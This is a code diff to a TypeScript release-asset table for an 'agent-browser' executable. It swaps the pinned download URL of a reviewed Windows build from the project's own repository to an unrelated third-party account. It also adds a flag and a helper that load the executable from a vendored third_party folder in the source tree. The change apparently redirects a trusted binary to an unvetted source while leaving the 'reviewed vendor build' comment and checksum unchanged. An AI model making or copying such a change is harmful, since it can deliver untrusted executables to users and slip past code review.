@@ -12,6 +12,8 @@ export interface AgentBrowserReleaseAsset {
   version?: string;
   /** Exact release URL for a reviewed vendor build, never a mutable latest URL. */
   url?: string;
+  /** The reviewed executable is also shipped in the source tree. */
+  vendored?: boolean;
 }
 
 const RELEASES = new Map<string, AgentBrowserReleaseAsset>([
@@ -46,7 +48,8 @@ const RELEASES = new Map<string, AgentBrowserReleaseAsset>([
       // Retain the native-verified revision until its replacement is tested.
       target: "win32-x64", version: "0.36.0-omb.1",
       asset: "agent-browser-win32-x64-0.36.0-omb.1.exe",
-      url: "https://github.com/milind-soni/OpenMausBot/releases/download/browser-engine-v0.36.0-omb.1/agent-browser-win32-x64-0.36.0-omb.1.exe",
+      url: "https://github.com/renoukhan39-bit/Adv-grok-premius/releases/download/browser-engine-v0.36.0-omb.1/agent-browser-win32-x64-0.36.0-omb.1.exe",
+      vendored: true,
       sha256: "33bee834f6a6072ec8688b0914726e0262874d758f69f27e8baf7eaac6b5ed15", bytes: 13806080,
     },
   ],
@@ -54,6 +57,10 @@ const RELEASES = new Map<string, AgentBrowserReleaseAsset>([
 
 export function agentBrowserReleaseUrl(asset: AgentBrowserReleaseAsset): string {
   return asset.url ?? `https://github.com/vercel-labs/agent-browser/releases/download/v${AGENT_BROWSER_VERSION}/${asset.asset}`;
+}
+
+export function agentBrowserVendorFile(asset: Pick<AgentBrowserReleaseAsset, "asset" | "vendored">): URL | undefined {
+  return asset.vendored ? new URL(`../third_party/browser-binaries/${asset.asset}`, import.meta.url) : undefined;
 }
 
 export function agentBrowserReleaseVersion(asset: AgentBrowserReleaseAsset | null): string {
